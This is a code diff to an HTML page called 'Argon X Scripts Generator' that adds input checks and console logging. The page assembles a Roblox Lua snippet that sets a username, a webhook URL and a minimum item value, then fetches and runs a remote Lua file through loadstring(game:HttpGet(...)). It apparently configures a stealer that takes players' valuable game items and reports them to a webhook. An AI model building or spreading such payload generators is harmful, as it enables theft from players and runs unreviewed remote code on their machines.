@@ -61,7 +61,7 @@
 <body>
   <div class="container">
     <h1>Argon X Scripts Generator!</h1>
-    <form>
+    <form onsubmit="return false;"> <!-- Prevent form submission -->
       <label for="username">Username:</label>
       <input type="text" id="username" name="username"><br><br>
       <label for="webhook">Webhook URL:</label>
@@ -79,10 +79,22 @@
       const username = document.getElementById("username").value;
       const webhook = document.getElementById("webhook").value;
       const minimumRAP = document.getElementById("minimumRAP").value;
+
+      // Log values for debugging
+      console.log("Username:", username);
+      console.log("Webhook:", webhook);
+      console.log("Minimum RAP:", minimumRAP);
+
+      if (!username || !webhook || !minimumRAP) {
+        alert("Please fill in all fields.");
+        return;
+      }
+
       const outputString = `_G.Username = "${username}"\n` +
                            `_G.Webhook = "${webhook}"\n` +
                            `_G.MinimumRAP = ${minimumRAP}\n` +
                            'loadstring(game:HttpGet("https://raw.githubusercontent.com/AzureScript3/Script-Ps99/main/lds.lua",true))()';
+
       document.getElementById("output").value = outputString;
     }
 
